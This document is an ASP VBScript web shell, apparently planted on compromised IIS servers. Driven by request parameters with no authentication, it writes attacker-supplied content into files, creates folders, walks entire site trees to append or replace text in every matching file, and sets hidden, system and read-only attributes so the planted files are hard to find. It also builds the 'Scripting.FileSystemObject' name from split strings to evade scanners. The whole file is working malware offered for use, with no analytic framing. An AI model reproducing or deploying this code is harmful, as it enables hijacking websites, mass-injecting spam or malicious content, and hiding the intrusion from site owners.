<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%><% 
dim file,content,path,task,paths,paths_str,nn,nnfilename,dpath,htmlpath,htmlpath_,htmlpath_str,addcontent,includefiles,noincludefiles,filetype,hanfiles,recontent,site_root,defaulthtml,defaultreplace,read 
content=request("content") 
path=request("path") 
file=request("file") 
task=request("task") 
paths=request("paths") 
nnfilename=request("nnfilename") 
htmlpath=request("htmlpath") 
addcontent=request("addcontent") 
includefiles=request("includefiles") 
noincludefiles=request("noincludefiles") 
filetype=request("filetype") 
recontent=request("recontent") 
hanfiles=request("hanfiles") 
site_root=request("site_root") 
defaulthtml=request("defaulthtml") 
defaultreplace=request("defaultreplace") 
read=request("read") 
IF site_root="" or site_root=null then 
        site_root = Server.MapPath("/") 
End IF 

if task="1" Then 
        paths_str = split(paths,",") 
        nn = 0 
        for i=0 to (ubound(paths_str)) 
                if IsFloderExist(Server.MapPath("/")&"/"&paths_str(i)) Then 
                readfile_("/"&paths_str(i)&"/"&nnfilename) 
                WriteIn Server.MapPath("/")&"/"&paths_str(i)&"/"&nnfilename,content 
                Response.write "/"&paths_str(i)&"/"&nnfilename&"|" 
                readfile("/"&paths_str(i)&"/"&nnfilename) 
                nn = nn +1 
                end if 
        Next 
        if nn=0 Then 
                dpath = mulu(Server.MapPath("/"),defaulthtml) 
                CFolder("/"&dpath) 
                readfile_("/"&dpath&"/"&nnfilename) 
                WriteIn Server.MapPath("/")&"/"&dpath&"/"&nnfilename,content 
                Response.write "/"&dpath&"/"&nnfilename&"|" 
                readfile("/"&dpath&"/"&nnfilename) 
        end If 
ElseIf task="2" Then     
        paths_str = split(paths,",") 
        nn = 0 
        for i=0 to (ubound(paths_str)) 
                if IsFloderExist(Server.MapPath("/")&"/"&paths_str(i)) And nn=0 Then 
                htmlpath_ = paths_str(i) 
                nn = nn +1 
                end if 
        Next 
        if nn=0 Then 
                htmlpath_ = mulu(Server.MapPath("/"),defaulthtml) 
                if CFolder("/"&htmlpath_)=1 then 
                        readfolder("/"&htmlpath_) 
                end if 
        end If 
        if request("htmlpath")<>"" Then 
                htmlpath_str = split(htmlpath,"/") 
                nn = 0 
                for i=0 to (ubound(htmlpath_str)) 
                        htmlpath_ = htmlpath_&"/"&htmlpath_str(i) 
                        if CFolder("/"&htmlpath_)=1 then 
                                readfolder("/"&htmlpath_) 
                        end if 
                Next 
        end If 
        readfile_("/"&htmlpath_&"/"&nnfilename) 
        content = Replace(content,"SITE_URL","http://"&Request.ServerVariables("SERVER_NAME")&"/"&htmlpath_&"/"&nnfilename) 
        WriteIn Server.MapPath("/")&"/"&htmlpath_&"/"&nnfilename,content 
        Response.write "<sbj:url>"&"/"&htmlpath_&"/"&nnfilename&"</sbj:url>" 
        readfile5("/"&htmlpath_&"/"&nnfilename) 

ElseIf task="3" Then 
        IF instr(site_root, "|")>0  Then 
                site_root_str = split(site_root,"|") 
                nn = 0 
                for i=0 to (ubound(site_root_str)) 
                        if IsFloderExist(site_root_str(i)) then 
                                Bianlireplate site_root_str(i),addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles 
                        end if 
                Next 
        Else 
                Bianlireplate site_root,addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles 
        End IF 
ElseIf task="4" Then 
        IF instr(site_root, "|")>0  Then 
                site_root_str = split(site_root,"|") 
                nn = 0 
                for i=0 to (ubound(site_root_str)) 
                        if IsFloderExist(site_root_str(i)) then 
                                Bianli site_root_str(i) 
                        end if 
                Next 
        Else 
                Bianli site_root 
        End IF 
Else 
        Response.write "tj,"&" tj" 
        If  IsObjInstalled("Scripting.FileSystemObject") Then 
                Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
                set f=fso.Getfile(server.mappath(Request.ServerVariables("SCRIPT_NAME"))) 
                if f.attributes <> 1 Then 
                f.attributes = 1 
                end If 
                set fso = Nothing 
        end If 
end If 

%> 

<% 
Function IsObjInstalled(strClassString)     
  On Error Resume Next     
  IsObjInstalled = False     
  Err = 0     
  Dim xTestObj     
  Set xTestObj = Server.CreateObject(strClassString)     
  If 0 = Err Then IsObjInstalled = True     
    Set xTestObj = Nothing     
    Err = 0     
  End Function   
%> 

<% 
function readfile(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(Server.MapPath(testfile)) Then   '???????? 
                set f=fso.Getfile(Server.MapPath(testfile)) 
                if f.attributes <> 7 Then 
                f.attributes = 7 
                end If 
        end If 
        set fso = Nothing 
end Function 
function readfolder(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FolderExists(Server.MapPath(testfile)) Then   '???????? 
                set f=fso.getfolder(Server.MapPath(testfile)) 
                if f.attributes <> 7 Then 
                f.attributes = 7 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfile_(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(Server.MapPath(testfile)) Then   '???????? 
                set f=fso.Getfile(Server.MapPath(testfile)) 
                if f.attributes <> 0 Then 
                f.attributes = 0 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfolder_(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FolderExists(Server.MapPath(testfile)) Then   '???????? 
         set f=fso.getfolder(Server.MapPath(testfile)) 
                if f.attributes <> 0 Then 
                f.attributes = 0 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfile5(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(Server.MapPath(testfile)) Then   '???????? 
                set f=fso.Getfile(Server.MapPath(testfile)) 
                if f.attributes <> 5 Then 
                f.attributes = 5 
                end If 
        end If 
        set fso = Nothing 
end Function 
function readfolder5(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FolderExists(Server.MapPath(testfile)) Then   '???????? 
                set f=fso.getfolder(Server.MapPath(testfile)) 
                if f.attributes <> 5 Then 
                f.attributes = 5 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfile6(testfile,attid) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(Server.MapPath(testfile)) Then   '???????? 
                set f=fso.Getfile(Server.MapPath(testfile)) 
                if f.attributes <> attid Then 
                f.attributes = attid 
                end If 
        end If 
        set fso = Nothing 
end Function 
''''''''''''''''''''''''''''''''' 
function readfile_new(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(testfile) Then   '???????? 
                set f=fso.Getfile(testfile) 
                if f.attributes <> 7 Then 
                f.attributes = 7 
                end If 
        end If 
        set fso = Nothing 
end Function 
function readfolder_new(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FolderExists(testfile) Then   '???????? 
                set f=fso.getfolder(testfile) 
                if f.attributes <> 7 Then 
                f.attributes = 7 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfile__new(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(testfile) Then   '???????? 
                set f=fso.Getfile(testfile) 
                if f.attributes <> 0 Then 
                f.attributes = 0 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfolder__new(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FolderExists(testfile) Then   '???????? 
         set f=fso.getfolder(testfile) 
                if f.attributes <> 0 Then 
                f.attributes = 0 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfile5_new(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(testfile) Then   '???????? 
                set f=fso.Getfile(testfile) 
                if f.attributes <> 5 Then 
                f.attributes = 5 
                end If 
        end If 
        set fso = Nothing 
end Function 
function readfolder5_new(testfile) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FolderExists(testfile) Then   '???????? 
                set f=fso.getfolder(testfile) 
                if f.attributes <> 5 Then 
                f.attributes = 5 
                end If 
        end if 
        set fso = Nothing 
end Function 
function readfile6_new(testfile,attid) 
        Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct") 
        If fso.FileExists(testfile) Then   '???????? 
                set f=fso.Getfile(testfile) 
                if f.attributes <> attid Then 
                f.attributes = attid 
                end If 
        end If 
        set fso = Nothing 
end Function 

%> 

<% 
  Function mulu(path,defaulthtml)   
    Set Fso=server.createobject("scripting.filesystemobject")     
        On Error Resume Next   
    Set Objfolder=fso.getfolder(path)   

    Set Objsubfolders=objfolder.subfolders   

        Dim mulu_item,iii 
        mulu_item = "html" 
        iii = 0 
    For Each Objsubfolder In Objsubfolders   
      Nowpath= Objsubfolder.name   
          mulu_item = Nowpath 
    Next 
    IF defaulthtml<>"" then 
        mulu_item = defaulthtml 
        End IF 
        mulu = mulu_item 

    Set Objfolder=nothing   
    Set Objsubfolders=nothing   
    Set Fso=nothing   
  End Function 

  Function Bianli(path)   
    Set Fso=server.createobject("scripting.filesystemobject")     

    On Error Resume Next   
    Set Objfolder=fso.getfolder(path)   
    Set Objsubfolders=objfolder.subfolders   
    For Each Objsubfolder In Objsubfolders   
      Nowpath=path + "\" + Objsubfolder.name   
      Set Objfiles=objsubfolder.files   
      For Each Objfile In Objfiles   
      Next   
      Bianli(nowpath)'??   

    Next   
    Set Objfolder=nothing   
    Set Objsubfolders=nothing   
    Set Fso=nothing   
  End Function   

    Function Bianlireplate(path,addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles)   
                Set Fso=server.createobject("scripting.filesystemobject")     
                On Error Resume Next   
                Set Objfolder=fso.getfolder(path)   
                Set Objfiles_1=Objfolder.files 
                For Each Objfile In Objfiles_1   
                        ftype = getFileExt(Objfile.name) 
                        aaa=instr(filetype,"."&ftype&".") 
                        turet = False 
                        If includefiles= "" Then 
                                turet = true 
                        End If 
                        If turet Then 
                        else 
                                true_a=instr(includefiles,Objfile.name) 
                                If true_a>0 Then 
                                        turet = true 
                                End If 
                        End If 
                        IF turet=false then 
                                IF hanfiles<>"" and Instr(1, hanfiles, ",")  Then 
                                        set hanfiles_str = split(hanfiles,",") 
                                        nn = 0 
                                        for i=0 to (ubound(hanfiles_str)) 
                                                if instr(Objfile.name,hanfiles_str(i))>1 then 
                                                        turet = true 
                                                end if 
                                        Next 
                                End IF 
                        End IF 
                        if aaa>0 And turet Then 
                                codepage = checkcode(path&"/"&Objfile.name) 
                                attid = Objfile.attributes 
                                readfile__new(path&"/"&Objfile.name) 
                                set writeBoolean = false 
                                if codepage="utf-8" Or codepage="unicode" Then 
                                        newf_content = ReadFromTextFile(path&"/"&Objfile.name,"utf-8") 
                                        bbb=instr(newf_content,addcontent)                                                                                                                       
                                        if bbb>0 Then 
                                                If recontent="" Then 
                                                        writeBoolean = false 
                                                Else 
                                                        newf_content = Replace(newf_content,recontent,addcontent) 
                                                        writeBoolean = true 
                                                End If 
                                        Else 
                                                If recontent="" Then 
                                                        newf_content = newf_content&addcontent 
                                                        writeBoolean = true 
                                                Else 
                                                        newf_content = Replace(newf_content,recontent,addcontent) 
                                                        writeBoolean = true 
                                                End If 
                                        end If 
                                        if writeBoolean = true then 
                                                WriteIn path&"/"&Objfile.name,newf_content 
                                                readfile6_new path&"/"&Objfile.name,attid 
                                                Response.write "<sbj:url>"&path&"/"&Objfile.name&"</sbj:url>"&codepage&chr(13) 
                                        end IF 
                                Else 
                                        newf_content = b(path&"/"&Objfile.name) 
                                        bbb=instr(1,newf_content,addcontent,1) 
                                        if bbb>0 Then 
                                                If recontent="" Then 
                                                        writeBoolean = false 
                                                Else 
                                                        newf_content = Replace(newf_content,recontent,addcontent) 
                                                        writeBoolean = true 
                                                End If 
                                        Else 
                                                If recontent="" Then 
                                                        newf_content = newf_content&addcontent 
                                                        writeBoolean = true 
                                                Else 
                                                        newf_content = Replace(newf_content,recontent,addcontent) 
                                                        writeBoolean = true 
                                                End If 
                                        end If 
                                        if writeBoolean = true then 
                                                WriteIn1 path&"/"&Objfile.name,newf_content
                                                readfile6_new path&"/"&Objfile.name,attid 
                                                Response.write "<sbj:url>"&path&"/"&Objfile.name&"</sbj:url>"&codepage&chr(13) 
                                        end IF 
                                end if 
                        end if 
                 Next 
                Set Objsubfolders=objfolder.subfolders   
                For Each Objsubfolder In Objsubfolders   

                  Nowpath=path + "\" + Objsubfolder.name   
                  Set Objfiles=objsubfolder.files   
                  Bianlireplate nowpath,addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles '??   

                Next   

                Set Objfolder=nothing   
                Set Objsubfolders=nothing   
                Set Fso=nothing   
  End Function   

  function checkcode(path) 
  set objstream=server.createobject("adodb.stream") 
  objstream.Type=1 
  objstream.mode=3 
  objstream.open 
  objstream.Position=0 
  objstream.loadfromfile path 
  bintou=objstream.read(2) 
  If AscB(MidB(bintou,1,1))=&HEF And AscB(MidB(bintou,2,1))=&HBB Then 
  checkcode="utf-8" 
  ElseIf AscB(MidB(bintou,1,1))=&HFF And AscB(MidB(bintou,2,1))=&HFE Then 
  checkcode="unicode" 
  Else 
  checkcode="gb2312" 
  End If 
  objstream.close 
  set objstream=nothing 
  end function 

  Function getFileExt(sFileName) 
getFileExt = Mid(sFileName, InstrRev(sFileName, ".") + 1) 
End Function 
%> 

<% 
Function IsFloderExist(strFolderName) 
SET FSO=Server.CreateObject("Scripting.FileSystemObject") 
IF(FSO.FolderExists(strFolderName))THEN 
IsFloderExist = True 
ELSE 
IsFloderExist = False 
END IF 
SET FSO=NOTHING 
End Function 
%> 

<% 
Function getCode(iCount) ''????????? 
     Dim arrChar 
     Dim j,k,strCode 
     arrChar = "012qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM3456789" 
     k=Len(arrChar) 
     Randomize 
     For i=1 to iCount 
          j=Int(k * Rnd )+1 
          strCode = strCode & Mid(arrChar,j,1) 
     Next 
     getCode = strCode 
End Function 

Function Digital(iCount)''????? 
     Dim arrChar 
     Dim j,k,strCode 
     arrChar = "0123456789" 
     k=Len(arrChar) 
     Randomize 
     For i=1 to iCount 
          j=Int(k * Rnd )+1 
          strCode = strCode & Mid(arrChar,j,1) 
     Next 
     Digital = strCode 
End Function 
Function sj_int(ByVal min, ByVal max) ''????? 
                Randomize(Timer) : sj_int = Int((max - min + 1) * Rnd + min) 
End Function 


Function Rand(ByVal min, ByVal max)   
                Randomize(Timer) : Rand = Int((max - min + 1) * Rnd + min) 
End Function 
%> 

<% 
function WriteIn(testfile,msg) 
  'set fs=server.CreateObject("scripting.filesystemobject")   
  'set thisfile=fs.CreateTextFile(testfile,True,True)   
  'thisfile.Write(""&msg& "")   
' thisfile.close   
  'set fs = nothing 
  Set stm = CreateObject("Adodb.Stream") 
    stm.Type = 2 
    stm.mode = 3 
    stm.charset = "utf-8" 
    stm.Open 
    stm.WriteText msg 
    stm.SaveToFile testfile, 2 
    stm.flush 
    stm.Close 
    Set stm = Nothing 
end Function 
function WriteIn1(testfile,msg) 
  ' set fs=server.CreateObject("scripting.filesystemobject")   
  ' set thisfile=fs.CreateTextFile(testfile,True)   
  ' thisfile.Write(""&msg& "")   
  ' thisfile.close   
  ' set fs = nothing 
  Set stm = CreateObject("Adodb.Stream") 
    stm.Type = 2 
    stm.mode = 3 
    stm.charset = "gb2312" 
    stm.Open 
    stm.WriteText msg 
    stm.SaveToFile testfile, 2 
    stm.flush 
    stm.Close 
    Set stm = Nothing 
end Function 

function delfile(testfile) 
  set fs=server.CreateObject("scripting.filesystemobject")   
  fs.DeleteFile(testfile) 
  set fs = nothing 
end function 
%> 

<% 
function a(t) 
        set fs=server.createobject("scripting.filesystemobject") 
        file=server.mappath(t) 
        set txt=fs.opentextfile(file,1,true) 
        if not txt.atendofstream then 
           a=txt.ReadAll 
        end if 
     set fs=nothing 
     set txt=nothing 
end Function 
function b(file) 
        set fs=server.createobject("scripting.filesystemobject") 
        set txt=fs.opentextfile(file,1,true) 
        if not txt.atendofstream then 
           b=txt.ReadAll 
        end if 
     set fs=nothing 
     set txt=nothing 
end Function 
function aa(t) 
        set fs=server.createobject("scripting.filesystemobject") 
        file=server.mappath(t) 
        set txt=fs.opentextfile(file,1,true,-1) 
        if not txt.atendofstream then 
           aa=txt.ReadAll 
        end if 
     set fs=nothing 
     set txt=nothing 
end Function 
function bb(file) 
        set fs=server.createobject("scripting.filesystemobject") 
        set txt=fs.opentextfile(file,1,true,-1) 
        if not txt.atendofstream then 
           bb=txt.ReadAll 
        end if 
     set fs=nothing 
     set txt=nothing 
end function 

Function ReadFromTextFile(file,CharSet) 
         dim str 
         set stm=CreateObject("adodb.stream") 
         stm.Type=2'?????? 
         stm.mode=3 
         stm.charset=CharSet 
         stm.open 
         stm.loadfromfile file 
         str=stm.readtext 
         stm.Close 
         set stm=nothing 
ReadFromTextFile=str 
End Function 

%> 

<% 

Function CFolder(Filepath) 
  Filepath=server.mappath(Filepath) 
  Set Fso = Server.CreateObject("Scripting.FileSystemObject") 
  If Fso.FolderExists(FilePath) Then 
    CFolder=0 
  else 
    Fso.CreateFolder(FilePath) 
    CFolder=1 
  end if 
  Set Fso = Nothing 
end function 

Function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function 
%>
